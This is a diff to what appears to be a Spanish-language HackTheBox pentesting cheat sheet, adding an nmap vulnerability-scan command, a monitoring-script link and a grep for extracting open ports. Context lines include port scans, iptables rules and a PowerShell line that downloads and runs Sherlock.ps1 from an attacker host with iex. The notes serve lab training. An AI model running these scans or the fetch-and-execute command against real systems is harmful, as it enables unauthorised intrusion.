@@ -6,6 +6,8 @@ Masscan -p 1-65535 10.10.10.30 -e tun0 –rate=1000
 nmap -sU -v 10.10.10.55
 nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000
 
+nmap -p 10,20,30 -sC -sV --script vuln ip --> escaneo vulnerabilidades full.
+
 ***************************************************************Cracking password**
 
 1. Extract hash zip
@@ -172,6 +174,7 @@ find / -iname *.txt
 
  **********************************monitorear crontabs
  ./pspy64
+ https://github.com/diegoexploit/HackTheBox/blob/master/monitoring.sh
  ***********************************iptables***************************
  iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
 iptables -A INPUT -p tcp --dport 22 -j REJECT
@@ -212,7 +215,8 @@ Response.write(o)
 *************************************Analizador de vulnerabilidades interno con sherlock
 Se pone el archivo en kali y se lanza con este comando para que descargue y haga el análisis.
 echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.27/Sherlock.ps1") | powershell -noprofile -
-
+************************************grep***********************************************************
+grep -oP '\d{1,5}/open' allports.gnmap | sort -u | grep -oP '\d{1,4}/' > ports.list -->Comando para extraer los puertos del resultado de una escaneo de puertos con -oA.
 
 
 
